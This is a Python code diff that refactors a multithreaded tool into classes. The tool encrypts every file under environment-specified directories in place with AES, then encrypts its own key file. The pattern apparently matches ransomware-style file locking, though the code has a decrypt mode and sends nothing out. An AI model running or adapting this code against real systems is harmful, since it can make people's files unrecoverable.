@@ -14,88 +14,94 @@ KEY_PATH = os.getenv("KEY_PATH")
 # MAX NUMBER OF THREADS TO ASSIGN
 MAX_THREADS = int(os.getenv("MAX_THREADS"))
 
-# Encrypting the file
-def encrypt_file(file_path):
-    with open(file_path, "rb") as f:
-        data = f.read() 
 
-    cipher = AES.new(key, AES.MODE_CBC)
-    ciphered_data = cipher.encrypt(pad(data, AES.block_size))
+class FileEncryptor:
+    def __init__(self, key):
+        self.key = key
 
-    with open(file_path, "wb") as f:
-        f.write(cipher.iv) # Initialization vector
-        f.write(ciphered_data)
+    # Encrypting the file
+    def encrypt_file(self, file_path) -> None:
+        with open(file_path, "rb") as f:
+            data = f.read() 
 
-# Decrypting the file
-def decrypt_file(file_path):
-    with open(file_path, "rb") as f:
-        iv = f.read(16) # Initialization vector
-        data = f.read()
+        cipher = AES.new(self.key, AES.MODE_CBC)
+        ciphered_data = cipher.encrypt(pad(data, AES.block_size))
 
-    cipher = AES.new(key, AES.MODE_CBC, iv)
-    deciphered_data = unpad(cipher.decrypt(data), AES.block_size)
+        with open(file_path, "wb") as f:
+            f.write(cipher.iv) # Initialization vector
+            f.write(ciphered_data)
 
-    with open(file_path, "wb") as f:
-        f.write(deciphered_data)
+    # Decrypting the file
+    def decrypt_file(self, file_path) -> None:
+        with open(file_path, "rb") as f:
+            iv = f.read(16) # Initialization vector
+            data = f.read()
 
-# Encrypting/Decrypting the directory
-def crypt_dir(directory, mode):
-    with os.scandir(directory) as entries:
-        for entry in entries:
-            if entry.is_file():
-                encrypt_file(entry.path) if mode == "encrypt" else decrypt_file(entry.path)
-                print(f"{mode.capitalize()}ed {entry.path}")
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        deciphered_data = unpad(cipher.decrypt(data), AES.block_size)
 
-            elif entry.is_dir():
-                crypt_dir(entry.path, mode)
+        with open(file_path, "wb") as f:
+            f.write(deciphered_data)
 
-def load_key():
-    with open(KEY_PATH, "rb") as f:
-        sym_key = f.read()
-    return sym_key
+class DirectoryEncryptor(FileEncryptor):
+    def __init__(self, key):
+        super().__init__(key)
+
+    # Encrypting/Decrypting the directory
+    def crypt_dir(self, directory, mode: str) -> None:
+        with os.scandir(directory) as entries:
+            for entry in entries:
+                if entry.is_file():
+                    self.encrypt_file(entry.path) if mode == "encrypt" else self.decrypt_file(entry.path)
+                    print(f"{mode.capitalize()}ed {entry.path}")
+
+                elif entry.is_dir():
+                    self.crypt_dir(entry.path, mode)
+
+    def crypt_all_dirs(self, mode: str) -> None:
+            threads: list[threading.Thread] = []
+            #[crypt_dir(target_dir_path, mode) for target_dir_path in target_dir_paths]
+            #! FILES IN THE ROOT DIRECTORY ARE NOT ENCRYPTED
+            for directory in target_dir_paths:
+                subdirs = [os.path.join(directory, entry) for entry in os.listdir(directory) if os.path.isdir(os.path.join(directory, entry))]
+
+                if len(subdirs) <= 1:
+                    self.crypt_dir(directory, mode)
+                    continue
+        
+                for subdir in subdirs:
+                    if len(threads) < MAX_THREADS:
+                        thread = threading.Thread(target=self.crypt_dir, args=(subdir, mode,))
+                        threads.append(thread)
+                        thread.start()
+                    else:
+                        self.crypt_dir(subdir, mode)
+            [thread.join() for thread in threads]
+            threads.clear()
 
 
 def main():
-    global key
-
-    def crypt_all_dirs(mode):
-        threads = []
-        #[crypt_dir(target_dir_path, mode) for target_dir_path in target_dir_paths]
-        #! FILES IN THE ROOT DIRECTORY ARE NOT ENCRYPTED
-        for directory in target_dir_paths:
-            subdirs = [os.path.join(directory, entry) for entry in os.listdir(directory) if os.path.isdir(os.path.join(directory, entry))]
-            sub_dir_num = len(subdirs)
-
-            if sub_dir_num <= 1:
-                crypt_dir(directory, mode)
-                continue
-     
-            for subdir in subdirs:
-                if len(threads) < MAX_THREADS:
-                    thread = threading.Thread(target=crypt_dir, args=(subdir, mode,))
-                    threads.append(thread)
-                    thread.start()
-                else:
-                    crypt_dir(subdir, mode)
-        [thread.join() for thread in threads]
-        threads.clear()
+    def load_key() -> str:
+        with open(KEY_PATH, "rb") as f:
+            sym_key = f.read()
+        return sym_key
 
     try:
         if sys.argv[1] == "encrypt":
             key = load_key()
-            crypt_all_dirs("encrypt")
+            DirectoryEncryptor(key).crypt_all_dirs("encrypt")
             encrypt_key(KEY_PATH)
         else:
             decrypt_key(KEY_PATH)
             key = load_key()
-            crypt_all_dirs("decrypt")
+            DirectoryEncryptor(key).crypt_all_dirs("decrypt")
     except FileNotFoundError:
         print("Could not find a key.")
     except ValueError:
         print("Files are encrypted or incorrect decryption.")
 
 if __name__ == "__main__":
-    target_dir_paths = os.getenv("TARGET_DIR_PATHS").split(", ")
+    target_dir_paths: list[str] = os.getenv("TARGET_DIR_PATHS").split(", ")
     if len(target_dir_paths) == 0:
         print("No directories to encrypt or decrypt.")
         sys.exit(0)
